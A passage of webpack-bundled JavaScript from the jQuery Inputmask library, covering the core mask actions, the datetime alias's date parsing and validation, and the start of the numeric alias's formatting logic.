                var initialValue = $.isFunction(opts.onBeforeMask) ? opts.onBeforeMask.call(inputmask, el.inputmask._valueGet(true), opts) || el.inputmask._valueGet(true) : el.inputmask._valueGet(true);
                if (initialValue !== "") checkVal(el, true, false, initialValue.split(""));
                var buffer = getBuffer().slice();
                undoValue = buffer.join("");
                if (isComplete(buffer) === false) {
                  if (opts.clearIncomplete) {
                    resetMaskSet();
                  }
                }
                if (opts.clearMaskOnLostFocus && document.activeElement !== el) {
                  if (getLastValidPosition() === -1) {
                    buffer = [];
                  } else {
                    clearOptionalTail(buffer);
                  }
                }
                if (opts.clearMaskOnLostFocus === false || opts.showMaskOnFocus && document.activeElement === el || el.inputmask._valueGet(true) !== "") writeBuffer(el, buffer);
                if (document.activeElement === el) {
                  caret(el, seekNext(getLastValidPosition()));
                }
              }
            }
          }
          var valueBuffer;
          if (actionObj !== undefined) {
            switch (actionObj.action) {
              case "isComplete":
                el = actionObj.el;
                return isComplete(getBuffer());
              case "unmaskedvalue":
                if (el === undefined || actionObj.value !== undefined) {
                  valueBuffer = actionObj.value;
                  valueBuffer = ($.isFunction(opts.onBeforeMask) ? opts.onBeforeMask.call(inputmask, valueBuffer, opts) || valueBuffer : valueBuffer).split("");
                  checkVal.call(this, undefined, false, false, valueBuffer);
                  if ($.isFunction(opts.onBeforeWrite)) opts.onBeforeWrite.call(inputmask, undefined, getBuffer(), 0, opts);
                }
                return unmaskedvalue(el);
              case "mask":
                mask(el);
                break;
              case "format":
                valueBuffer = ($.isFunction(opts.onBeforeMask) ? opts.onBeforeMask.call(inputmask, actionObj.value, opts) || actionObj.value : actionObj.value).split("");
                checkVal.call(this, undefined, true, false, valueBuffer);
                if (actionObj.metadata) {
                  return {
                    value: isRTL ? getBuffer().slice().reverse().join("") : getBuffer().join(""),
                    metadata: maskScope.call(this, {
                      action: "getmetadata"
                    }, maskset, opts)
                  };
                }
                return isRTL ? getBuffer().slice().reverse().join("") : getBuffer().join("");
              case "isValid":
                if (actionObj.value) {
                  valueBuffer = actionObj.value.split("");
                  checkVal.call(this, undefined, true, true, valueBuffer);
                } else {
                  actionObj.value = getBuffer().join("");
                }
                var buffer = getBuffer();
                var rl = determineLastRequiredPosition(),
                  lmib = buffer.length - 1;
                for (; lmib > rl; lmib--) {
                  if (isMask(lmib)) break;
                }
                buffer.splice(rl, lmib + 1 - rl);
                return isComplete(buffer) && actionObj.value === getBuffer().join("");
              case "getemptymask":
                return getBufferTemplate().join("");
              case "remove":
                if (el && el.inputmask) {
                  $.data(el, "_inputmask_opts", null);
                  $el = $(el);
                  el.inputmask._valueSet(opts.autoUnmask ? unmaskedvalue(el) : el.inputmask._valueGet(true));
                  EventRuler.off(el);
                  if (el.inputmask.colorMask) {
                    colorMask = el.inputmask.colorMask;
                    colorMask.removeChild(el);
                    colorMask.parentNode.insertBefore(el, colorMask);
                    colorMask.parentNode.removeChild(colorMask);
                  }
                  var valueProperty;
                  if (Object.getOwnPropertyDescriptor && Object.getPrototypeOf) {
                    valueProperty = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(el), "value");
                    if (valueProperty) {
                      if (el.inputmask.__valueGet) {
                        Object.defineProperty(el, "value", {
                          get: el.inputmask.__valueGet,
                          set: el.inputmask.__valueSet,
                          configurable: true
                        });
                      }
                    }
                  } else if (document.__lookupGetter__ && el.__lookupGetter__("value")) {
                    if (el.inputmask.__valueGet) {
                      el.__defineGetter__("value", el.inputmask.__valueGet);
                      el.__defineSetter__("value", el.inputmask.__valueSet);
                    }
                  }
                  el.inputmask = undefined;
                }
                return el;
                break;
              case "getmetadata":
                if ($.isArray(maskset.metadata)) {
                  var maskTarget = getMaskTemplate(true, 0, false).join("");
                  $.each(maskset.metadata, function (ndx, mtdt) {
                    if (mtdt.mask === maskTarget) {
                      maskTarget = mtdt;
                      return false;
                    }
                  });
                  return maskTarget;
                }
                return maskset.metadata;
            }
          }
        }
        return Inputmask;
      });
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      (function (factory) {
        if (true) {
          !(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(4)], __WEBPACK_AMD_DEFINE_FACTORY__ = factory, __WEBPACK_AMD_DEFINE_RESULT__ = typeof __WEBPACK_AMD_DEFINE_FACTORY__ === "function" ? __WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__) : __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        } else {}
      })(function ($) {
        return $;
      });
    }, function (module, exports) {
      module.exports = jQuery;
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      if (true) !(__WEBPACK_AMD_DEFINE_RESULT__ = function () {
        return window;
      }.call(exports, __webpack_require__, exports, module), __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));else {}
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      if (true) !(__WEBPACK_AMD_DEFINE_RESULT__ = function () {
        return document;
      }.call(exports, __webpack_require__, exports, module), __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));else {}
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      (function (factory) {
        if (true) {
          !(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(2)], __WEBPACK_AMD_DEFINE_FACTORY__ = factory, __WEBPACK_AMD_DEFINE_RESULT__ = typeof __WEBPACK_AMD_DEFINE_FACTORY__ === "function" ? __WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__) : __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        } else {}
      })(function (Inputmask) {
        var $ = Inputmask.dependencyLib;
        var formatCode = {
            d: ["[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", Date.prototype.getDate],
            dd: ["0[1-9]|[12][0-9]|3[01]", Date.prototype.setDate, "day", function () {
              return pad(Date.prototype.getDate.call(this), 2);
            }],
            ddd: [""],
            dddd: [""],
            m: ["[1-9]|1[012]", Date.prototype.setMonth, "month", function () {
              return Date.prototype.getMonth.call(this) + 1;
            }],
            mm: ["0[1-9]|1[012]", Date.prototype.setMonth, "month", function () {
              return pad(Date.prototype.getMonth.call(this) + 1, 2);
            }],
            mmm: [""],
            mmmm: [""],
            yy: ["[0-9]{2}", Date.prototype.setFullYear, "year", function () {
              return pad(Date.prototype.getFullYear.call(this), 2);
            }],
            yyyy: ["[0-9]{4}", Date.prototype.setFullYear, "year", function () {
              return pad(Date.prototype.getFullYear.call(this), 4);
            }],
            h: ["[1-9]|1[0-2]", Date.prototype.setHours, "hours", Date.prototype.getHours],
            hh: ["0[1-9]|1[0-2]", Date.prototype.setHours, "hours", function () {
              return pad(Date.prototype.getHours.call(this), 2);
            }],
            hhh: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours],
            H: ["1?[0-9]|2[0-3]", Date.prototype.setHours, "hours", Date.prototype.getHours],
            HH: ["[01][0-9]|2[0-3]", Date.prototype.setHours, "hours", function () {
              return pad(Date.prototype.getHours.call(this), 2);
            }],
            HHH: ["[0-9]+", Date.prototype.setHours, "hours", Date.prototype.getHours],
            M: ["[1-5]?[0-9]", Date.prototype.setMinutes, "minutes", Date.prototype.getMinutes],
            MM: ["[0-5][0-9]", Date.prototype.setMinutes, "minutes", function () {
              return pad(Date.prototype.getMinutes.call(this), 2);
            }],
            s: ["[1-5]?[0-9]", Date.prototype.setSeconds, "seconds", Date.prototype.getSeconds],
            ss: ["[0-5][0-9]", Date.prototype.setSeconds, "seconds", function () {
              return pad(Date.prototype.getSeconds.call(this), 2);
            }],
            l: ["[0-9]{3}", Date.prototype.setMilliseconds, "milliseconds", function () {
              return pad(Date.prototype.getMilliseconds.call(this), 3);
            }],
            L: ["[0-9]{2}", Date.prototype.setMilliseconds, "milliseconds", function () {
              return pad(Date.prototype.getMilliseconds.call(this), 2);
            }],
            t: ["[ap]"],
            tt: ["[ap]m"],
            T: ["[AP]"],
            TT: ["[AP]M"],
            Z: [""],
            o: [""],
            S: [""]
          },
          formatAlias = {
            isoDate: "yyyy-mm-dd",
            isoTime: "HH:MM:ss",
            isoDateTime: "yyyy-mm-dd'T'HH:MM:ss",
            isoUtcDateTime: "UTC:yyyy-mm-dd'T'HH:MM:ss'Z'"
          };
        function getTokenizer(opts) {
          if (!opts.tokenizer) {
            var tokens = [];
            for (var ndx in formatCode) {
              if (tokens.indexOf(ndx[0]) === -1) tokens.push(ndx[0]);
            }
            opts.tokenizer = "(" + tokens.join("+|") + ")+?|.";
            opts.tokenizer = new RegExp(opts.tokenizer, "g");
          }
          return opts.tokenizer;
        }
        function isValidDate(dateParts, currentResult) {
          return !isFinite(dateParts.rawday) || dateParts.day == "29" && !isFinite(dateParts.rawyear) || new Date(dateParts.date.getFullYear(), isFinite(dateParts.rawmonth) ? dateParts.month : dateParts.date.getMonth() + 1, 0).getDate() >= dateParts.day ? currentResult : false;
        }
        function isDateInRange(dateParts, opts) {
          var result = true;
          if (opts.min) {
            if (dateParts["rawyear"]) {
              var rawYear = dateParts["rawyear"].replace(/[^0-9]/g, ""),
                minYear = opts.min.year.substr(0, rawYear.length);
              result = minYear <= rawYear;
            }
            if (dateParts["year"] === dateParts["rawyear"]) {
              if (opts.min.date.getTime() === opts.min.date.getTime()) {
                result = opts.min.date.getTime() <= dateParts.date.getTime();
              }
            }
          }
          if (result && opts.max && opts.max.date.getTime() === opts.max.date.getTime()) {
            result = opts.max.date.getTime() >= dateParts.date.getTime();
          }
          return result;
        }
        function parse(format, dateObjValue, opts, raw) {
          var mask = "",
            match;
          while (match = getTokenizer(opts).exec(format)) {
            if (dateObjValue === undefined) {
              if (formatCode[match[0]]) {
                mask += "(" + formatCode[match[0]][0] + ")";
              } else {
                switch (match[0]) {
                  case "[":
                    mask += "(";
                    break;
                  case "]":
                    mask += ")?";
                    break;
                  default:
                    mask += Inputmask.escapeRegex(match[0]);
                }
              }
            } else {
              if (formatCode[match[0]]) {
                if (raw !== true && formatCode[match[0]][3]) {
                  var getFn = formatCode[match[0]][3];
                  mask += getFn.call(dateObjValue.date);
                } else if (formatCode[match[0]][2]) mask += dateObjValue["raw" + formatCode[match[0]][2]];else mask += match[0];
              } else mask += match[0];
            }
          }
          return mask;
        }
        function pad(val, len) {
          val = String(val);
          len = len || 2;
          while (val.length < len) {
            val = "0" + val;
          }
          return val;
        }
        function analyseMask(maskString, format, opts) {
          var dateObj = {
              date: new Date(1, 0, 1)
            },
            targetProp,
            mask = maskString,
            match,
            dateOperation,
            targetValidator;
          function extendProperty(value) {
            var correctedValue;
            if (opts.min && opts.min[targetProp] || opts.max && opts.max[targetProp]) {
              var min = opts.min && opts.min[targetProp] || opts.max[targetProp],
                max = opts.max && opts.max[targetProp] || opts.min[targetProp];
              correctedValue = value.replace(/[^0-9]/g, "");
              correctedValue += (min.indexOf(correctedValue) < max.indexOf(correctedValue) ? max : min).toString().substr(correctedValue.length);
              while (!new RegExp(targetValidator).test(correctedValue)) {
                correctedValue--;
              }
            } else correctedValue = value.replace(/[^0-9]/g, "0");
            return correctedValue;
          }
          function setValue(dateObj, value, opts) {
            dateObj[targetProp] = extendProperty(value);
            dateObj["raw" + targetProp] = value;
            if (dateOperation !== undefined) dateOperation.call(dateObj.date, targetProp == "month" ? parseInt(dateObj[targetProp]) - 1 : dateObj[targetProp]);
          }
          if (typeof mask === "string") {
            while (match = getTokenizer(opts).exec(format)) {
              var value = mask.slice(0, match[0].length);
              if (formatCode.hasOwnProperty(match[0])) {
                targetValidator = formatCode[match[0]][0];
                targetProp = formatCode[match[0]][2];
                dateOperation = formatCode[match[0]][1];
                setValue(dateObj, value, opts);
              }
              mask = mask.slice(value.length);
            }
            return dateObj;
          } else if (mask && (typeof mask === "undefined" ? "undefined" : _typeof(mask)) === "object" && mask.hasOwnProperty("date")) {
            return mask;
          }
          return undefined;
        }
        Inputmask.extendAliases({
          datetime: {
            mask: function mask(opts) {
              formatCode.S = opts.i18n.ordinalSuffix.join("|");
              opts.inputFormat = formatAlias[opts.inputFormat] || opts.inputFormat;
              opts.displayFormat = formatAlias[opts.displayFormat] || opts.displayFormat || opts.inputFormat;
              opts.outputFormat = formatAlias[opts.outputFormat] || opts.outputFormat || opts.inputFormat;
              opts.placeholder = opts.placeholder !== "" ? opts.placeholder : opts.inputFormat.replace(/[\[\]]/, "");
              opts.regex = parse(opts.inputFormat, undefined, opts);
              return null;
            },
            placeholder: "",
            inputFormat: "isoDateTime",
            displayFormat: undefined,
            outputFormat: undefined,
            min: null,
            max: null,
            i18n: {
              dayNames: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"],
              monthNames: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"],
              ordinalSuffix: ["st", "nd", "rd", "th"]
            },
            postValidation: function postValidation(buffer, pos, currentResult, opts) {
              opts.min = analyseMask(opts.min, opts.inputFormat, opts);
              opts.max = analyseMask(opts.max, opts.inputFormat, opts);
              var result = currentResult,
                dateParts = analyseMask(buffer.join(""), opts.inputFormat, opts);
              if (result && dateParts.date.getTime() === dateParts.date.getTime()) {
                result = isValidDate(dateParts, result);
                result = result && isDateInRange(dateParts, opts);
              }
              if (pos && result && currentResult.pos !== pos) {
                return {
                  buffer: parse(opts.inputFormat, dateParts, opts),
                  refreshFromBuffer: {
                    start: pos,
                    end: currentResult.pos
                  }
                };
              }
              return result;
            },
            onKeyDown: function onKeyDown(e, buffer, caretPos, opts) {
              var input = this;
              if (e.ctrlKey && e.keyCode === Inputmask.keyCode.RIGHT) {
                var today = new Date(),
                  match,
                  date = "";
                while (match = getTokenizer(opts).exec(opts.inputFormat)) {
                  if (match[0].charAt(0) === "d") {
                    date += pad(today.getDate(), match[0].length);
                  } else if (match[0].charAt(0) === "m") {
                    date += pad(today.getMonth() + 1, match[0].length);
                  } else if (match[0] === "yyyy") {
                    date += today.getFullYear().toString();
                  } else if (match[0].charAt(0) === "y") {
                    date += pad(today.getYear(), match[0].length);
                  }
                }
                input.inputmask._valueSet(date);
                $(input).trigger("setvalue");
              }
            },
            onUnMask: function onUnMask(maskedValue, unmaskedValue, opts) {
              return parse(opts.outputFormat, analyseMask(maskedValue, opts.inputFormat, opts), opts, true);
            },
            casing: function casing(elem, test, pos, validPositions) {
              if (test.nativeDef.indexOf("[ap]") == 0) return elem.toLowerCase();
              if (test.nativeDef.indexOf("[AP]") == 0) return elem.toUpperCase();
              return elem;
            },
            insertMode: false
          }
        });
        return Inputmask;
      });
    }, function (module, exports, __webpack_require__) {
      "use strict";

      var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;
      var _typeof = typeof Symbol === "function" && _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(Symbol.iterator) === "symbol" ? function (obj) {
        return _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      } : function (obj) {
        return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(obj);
      };
      (function (factory) {
        if (true) {
          !(__WEBPACK_AMD_DEFINE_ARRAY__ = [__webpack_require__(2)], __WEBPACK_AMD_DEFINE_FACTORY__ = factory, __WEBPACK_AMD_DEFINE_RESULT__ = typeof __WEBPACK_AMD_DEFINE_FACTORY__ === "function" ? __WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__) : __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
        } else {}
      })(function (Inputmask) {
        var $ = Inputmask.dependencyLib;
        function autoEscape(txt, opts) {
          var escapedTxt = "";
          for (var i = 0; i < txt.length; i++) {
            if (Inputmask.prototype.definitions[txt.charAt(i)] || opts.definitions[txt.charAt(i)] || opts.optionalmarker.start === txt.charAt(i) || opts.optionalmarker.end === txt.charAt(i) || opts.quantifiermarker.start === txt.charAt(i) || opts.quantifiermarker.end === txt.charAt(i) || opts.groupmarker.start === txt.charAt(i) || opts.groupmarker.end === txt.charAt(i) || opts.alternatormarker === txt.charAt(i)) {
              escapedTxt += "\\" + txt.charAt(i);
            } else escapedTxt += txt.charAt(i);
          }
          return escapedTxt;
        }
        function alignDigits(buffer, opts) {
          if (opts.numericInput) {
            var radixPosition = $.inArray(opts.radixPoint, buffer);
            if (radixPosition === -1) {
              buffer.push(opts.radixPoint);
              radixPosition = buffer.length - 1;
            }
            for (var i = 1; i <= opts.digits; i++) {
              buffer[radixPosition + i] = buffer[radixPosition + i] || "0";
            }
          }
          return buffer;
        }
        Inputmask.extendAliases({
          numeric: {
            mask: function mask(opts) {
              if (opts.repeat !== 0 && isNaN(opts.integerDigits)) {
                opts.integerDigits = opts.repeat;
              }
              opts.repeat = 0;
              if (opts.groupSeparator === opts.radixPoint && opts.digits && opts.digits !== "0") {
                if (opts.radixPoint === ".") {
                  opts.groupSeparator = ",";
                } else if (opts.radixPoint === ",") {
                  opts.groupSeparator = ".";
                } else opts.groupSeparator = "";
              }
              if (opts.groupSeparator === " ") {
                opts.skipOptionalPartCharacter = undefined;
              }
              opts.autoGroup = opts.autoGroup && opts.groupSeparator !== "";
              if (opts.autoGroup) {
                if (typeof opts.groupSize == "string" && isFinite(opts.groupSize)) opts.groupSize = parseInt(opts.groupSize);
                if (isFinite(opts.integerDigits)) {
                  var seps = Math.floor(opts.integerDigits / opts.groupSize);
                  var mod = opts.integerDigits % opts.groupSize;
                  opts.integerDigits = parseInt(opts.integerDigits) + (mod === 0 ? seps - 1 : seps);
                  if (opts.integerDigits < 1) {
                    opts.integerDigits = "*";
                  }
                }
              }
              if (opts.placeholder.length > 1) {
                opts.placeholder = opts.placeholder.charAt(0);
              }
              if (opts.positionCaretOnClick === "radixFocus" && opts.placeholder === "" && opts.integerOptional === false) {
                opts.positionCaretOnClick = "lvp";
              }
              opts.definitions[";"] = opts.definitions["~"];
              opts.definitions[";"].definitionSymbol = "~";
              if (opts.numericInput === true) {
                opts.positionCaretOnClick = opts.positionCaretOnClick === "radixFocus" ? "lvp" : opts.positionCaretOnClick;
                opts.digitsOptional = false;
                if (isNaN(opts.digits)) opts.digits = 2;
                opts.decimalProtect = false;
              }
              var mask = "[+]";
              mask += autoEscape(opts.prefix, opts);
              if (opts.integerOptional === true) {
                mask += "~{1," + opts.integerDigits + "}";
              } else mask += "~{" + opts.integerDigits + "}";
              if (opts.digits !== undefined) {
                var radixDef = opts.decimalProtect ? ":" : opts.radixPoint;
                var dq = opts.digits.toString().split(",");
                if (isFinite(dq[0]) && dq[1] && isFinite(dq[1])) {
                  mask += radixDef + ";{" + opts.digits + "}";
                } else if (isNaN(opts.digits) || parseInt(opts.digits) > 0) {
                  if (opts.digitsOptional) {
                    mask += "[" + radixDef + ";{1," + opts.digits + "}]";
                  } else mask += radixDef + ";{" + opts.digits + "}";
                }
              }
              mask += autoEscape(opts.suffix, opts);
              mask += "[-]";
              opts.greedy = false;
              return mask;
            },
            placeholder: "",
            greedy: false,
            digits: "*",
            digitsOptional: true,
            enforceDigitsOnBlur: false,
            radixPoint: ".",
            positionCaretOnClick: "radixFocus",
            groupSize: 3,
            groupSeparator: "",
            autoGroup: false,
            allowMinus: true,
            negationSymbol: {
              front: "-",
              back: ""
            },
            integerDigits: "+",
            integerOptional: true,
            prefix: "",
            suffix: "",
            rightAlign: true,
            decimalProtect: true,
            min: null,
            max: null,
            step: 1,
            insertMode: true,
            autoUnmask: false,
            unmaskAsNumber: false,
            inputmode: "numeric",
            preValidation: function preValidation(buffer, pos, c, isSelection, opts, maskset) {
              if (c === "-" || c === opts.negationSymbol.front) {
                if (opts.allowMinus !== true) return false;
                opts.isNegative = opts.isNegative === undefined ? true : !opts.isNegative;
                if (buffer.join("") === "") return true;
                return {
                  caret: maskset.validPositions[pos] ? pos : undefined,
                  dopost: true
                };
              }
              if (isSelection === false && c === opts.radixPoint && opts.digits !== undefined && (isNaN(opts.digits) || parseInt(opts.digits) > 0)) {
                var radixPos = $.inArray(opts.radixPoint, buffer);
                if (radixPos !== -1 && maskset.validPositions[radixPos] !== undefined) {
                  if (opts.numericInput === true) {
                    return pos === radixPos;
                  }
                  return {
                    caret: radixPos + 1
                  };
                }
              }
              return true;
            },
            postValidation: function postValidation(buffer, pos, currentResult, opts) {
              function buildPostMask(buffer, opts) {
                var postMask = "";
                postMask += "(" + opts.groupSeparator + "*{" + opts.groupSize + "}){*}";
                if (opts.radixPoint !== "") {
                  var radixSplit = buffer.join("").split(opts.radixPoint);
                  if (radixSplit[1]) {
                    postMask += opts.radixPoint + "*{" + radixSplit[1].match(/^\d*\??\d*/)[0].length + "}";
                  }
                }
                return postMask;
              }
              var suffix = opts.suffix.split(""),
                prefix = opts.prefix.split("");
              if (currentResult.pos === undefined && currentResult.caret !== undefined && currentResult.dopost !== true) return currentResult;
              var caretPos = currentResult.caret !== undefined ? currentResult.caret : currentResult.pos;
              var maskedValue = buffer.slice();
              if (opts.numericInput) {
                caretPos = maskedValue.length - caretPos - 1;
                maskedValue = maskedValue.reverse();
              }
              var charAtPos = maskedValue[caretPos];
              if (charAtPos === opts.groupSeparator) {
                caretPos += 1;
                charAtPos = maskedValue[caretPos];
              }
              if (caretPos === maskedValue.length - opts.suffix.length - 1 && charAtPos === opts.radixPoint) return currentResult;
              if (charAtPos !== undefined) {
                if (charAtPos !== opts.radixPoint && charAtPos !== opts.negationSymbol.front && charAtPos !== opts.negationSymbol.back) {
                  maskedValue[caretPos] = "?";
                  if (opts.prefix.length > 0 && caretPos >= (opts.isNegative === false ? 1 : 0) && caretPos < opts.prefix.length - 1 + (opts.isNegative === false ? 1 : 0)) {
                    prefix[caretPos - (opts.isNegative === false ? 1 : 0)] = "?";
                  } else if (opts.suffix.length > 0 && caretPos >= maskedValue.length - opts.suffix.length - (opts.isNegative === false ? 1 : 0)) {
                    suffix[caretPos - (maskedValue.length - opts.suffix.length - (opts.isNegative === false ? 1 : 0))] = "?";
                  }
                }
              }
              prefix = prefix.join("");
              suffix = suffix.join("");
              var processValue = maskedValue.join("").replace(prefix, "");
              processValue = processValue.replace(suffix, "");
              processValue = processValue.replace(new RegExp(Inputmask.escapeRegex(opts.groupSeparator), "g"), "");
              processValue = processValue.replace(new RegExp("[-" + Inputmask.escapeRegex(opts.negationSymbol.front) + "]", "g"), "");
              processValue = processValue.replace(new RegExp(Inputmask.escapeRegex(opts.negationSymbol.back) + "$"), "");
              if (isNaN(opts.placeholder)) {
                processValue = processValue.replace(new RegExp(Inputmask.escapeRegex(opts.placeholder), "g"), "");
              }
              if (processValue.length > 1 && processValue.indexOf(opts.radixPoint) !== 1) {
                if (charAtPos === "0") {
                  processValue = processValue.replace(/^\?/g, "");
                }
                processValue = processValue.replace(/^0/g, "");
              }
              if (processValue.charAt(0) === opts.radixPoint && opts.radixPoint !== "" && opts.numericInput !== true) {
                processValue = "0" + processValue;
              }
              if (processValue !== "") {
                processValue = processValue.split("");
                if ((!opts.digitsOptional || opts.enforceDigitsOnBlur && currentResult.event === "blur") && isFinite(opts.digits)) {
                  var radixPosition = $.inArray(opts.radixPoint, processValue);
                  var rpb = $.inArray(opts.radixPoint, maskedValue);
                  if (radixPosition === -1) {
                    processValue.push(opts.radixPoint);
                    radixPosition = processValue.length - 1;
                  }
                  for (var i = 1; i <= opts.digits; i++) {
                    if ((!opts.digitsOptional || opts.enforceDigitsOnBlur && currentResult.event === "blur") && (processValue[radixPosition + i] === undefined || processValue[radixPosition + i] === opts.placeholder.charAt(0))) {
                      processValue[radixPosition + i] = currentResult.placeholder || opts.placeholder.charAt(0);
                    } else if (rpb !== -1 && maskedValue[rpb + i] !== undefined) {
                      processValue[radixPosition + i] = processValue[radixPosition + i] || maskedValue[rpb + i];
                    }
                  }
                }
                if (opts.autoGroup === true && opts.groupSeparator !== "" && (charAtPos !== opts.radixPoint || currentResult.pos !== undefined || currentResult.dopost)) {
                  var addRadix = processValue[processValue.length - 1] === opts.radixPoint && currentResult.c === opts.radixPoint;
                  processValue = Inputmask(buildPostMask(processValue, opts), {
                    numericInput: true,
                    jitMasking: true,
                    definitions: {
                      "*": {
                        validator: "[0-9?]",
                        cardinality: 1
                      }
                    }
                  }).format(processValue.join(""));
                  if (addRadix) processValue += opts.radixPoint;
                  if (processValue.charAt(0) === opts.groupSeparator) {
                    processValue.substr(1);
                  }
                } else processValue = processValue.join("");
              }
              if (opts.isNegative && currentResult.event === "blur") {
                opts.isNegative = processValue !== "0";
              }
              processValue = prefix + processValue;
              processValue += suffix;
              if (opts.isNegative) {
                processValue = opts.negationSymbol.front + processValue;
                processValue += opts.negationSymbol.back;
              }
              processValue = processValue.split("");
              if (charAtPos !== undefined) {
                if (charAtPos !== opts.radixPoint && charAtPos !== opts.negationSymbol.front && charAtPos !== opts.negationSymbol.back) {
                  caretPos = $.inArray("?", processValue);
                  if (caretPos > -1) {
                    processValue[caretPos] = charAtPos;
                  } else caretPos = currentResult.caret || 0;
                } else if (charAtPos === opts.radixPoint || charAtPos === opts.negationSymbol.front || charAtPos === opts.negationSymbol.back) {
                  var newCaretPos = $.inArray(charAtPos, processValue);
                  if (newCaretPos !== -1) caretPos = newCaretPos;
                }
              }
              if (opts.numericInput) {
                caretPos = processValue.length - caretPos - 1;
                processValue = processValue.reverse();
              }
              var rslt = {
                caret: (charAtPos === undefined || currentResult.pos !== undefined) && caretPos !== undefined ? caretPos + (opts.numericInput ? -1 : 1) : caretPos,
                buffer: processValue,
                refreshFromBuffer: currentResult.dopost || buffer.join("") !== processValue.join("")
              };
              return rslt.refreshFromBuffer ? rslt : currentResult;
            },
            onBeforeWrite: function onBeforeWrite(e, buffer, caretPos, opts) {
              function parseMinMaxOptions(opts) {
                if (opts.parseMinMaxOptions === undefined) {
                  if (opts.min !== null) {
                    opts.min = opts.min.toString().replace(new RegExp(Inputmask.escapeRegex(opts.groupSeparator), "g"), "");
                    if (opts.radixPoint === ",") opts.min = opts.min.replace(opts.radixPoint, ".");
                    opts.min = isFinite(opts.min) ? parseFloat(opts.min) : NaN;
                    if (isNaN(opts.min)) opts.min = Number.MIN_VALUE;
                  }
                  if (opts.max !== null) {
                    opts.max = opts.max.toString().replace(new RegExp(Inputmask.escapeRegex(opts.groupSeparator), "g"), "");
                    if (opts.radixPoint === ",") opts.max = opts.max.replace(opts.radixPoint, ".");
                    opts.max = isFinite(opts.max) ? parseFloat(opts.max) : NaN;
                    if (isNaN(opts.max)) opts.max = Number.MAX_VALUE;
                  }
                  opts.parseMinMaxOptions = "done";
                }
              }
              if (e) {
                switch (e.type) {
                  case "keydown":
                    return opts.postValidation(buffer, caretPos, {
                      caret: caretPos,
                      dopost: true
                    }, opts);
                  case "blur":
                  case "checkval":
                    var unmasked;
